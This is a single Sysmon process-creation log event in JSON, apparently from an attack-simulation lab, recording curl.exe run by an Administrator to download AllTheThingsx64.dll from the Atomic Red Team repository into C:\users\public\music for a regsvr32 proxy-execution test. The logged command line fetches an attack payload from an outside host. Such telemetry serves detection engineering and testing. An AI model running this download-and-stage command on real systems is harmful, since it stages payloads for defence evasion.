{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Provider": {
        "#attributes": {
          "Name": "Microsoft-Windows-Sysmon",
          "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
        }
      },
      "EventID": 1,
      "Version": 5,
      "Level": 4,
      "Task": 1,
      "Opcode": 0,
      "Keywords": "0x8000000000000000",
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2025-10-25T13:23:21.381915Z"
        }
      },
      "EventRecordID": 8613670,
      "Correlation": null,
      "Execution": {
        "#attributes": {
          "ProcessID": 3308,
          "ThreadID": 4008
        }
      },
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "ar-win-dc.attackrange.local",
      "Security": {
        "#attributes": {
          "UserID": "S-1-5-18"
        }
      }
    },
    "EventData": {
      "RuleName": "-",
      "UtcTime": "2025-10-25 13:23:21.362",
      "ProcessGuid": "5AA13A44-CF49-68FC-2630-000000004002",
      "ProcessId": 9032,
      "Image": "C:\\Windows\\System32\\curl.exe",
      "FileVersion": "8.13.0",
      "Description": "The curl executable",
      "Product": "The curl executable",
      "Company": "curl, https://curl.se/",
      "OriginalFileName": "curl.exe",
      "CommandLine": "curl  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll",
      "CurrentDirectory": "C:\\Users\\Administrator\\Downloads\\",
      "User": "ATTACKRANGE\\Administrator",
      "LogonGuid": "5AA13A44-568F-68FB-E39A-520000000000",
      "LogonId": "0x529ae3",
      "TerminalSessionId": 2,
      "IntegrityLevel": "High",
      "Hashes": "SHA1=A1BD7848E36F22021C68F4F24EDFDB7ACE42FCA3,MD5=90939B67542D77A32042B7C1945623B1,SHA256=3345339164CF384EFF527B6C3160FEA8D849A4231EC6CA80513E3A739E505168,IMPHASH=6C25E5A258C8C037CD5FBE44B10E696F",
      "ParentProcessGuid": "5AA13A44-0FEC-68FC-281E-000000004002",
      "ParentProcessId": 6304,
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\"",
      "ParentUser": "ATTACKRANGE\\Administrator"
    }
  }
}
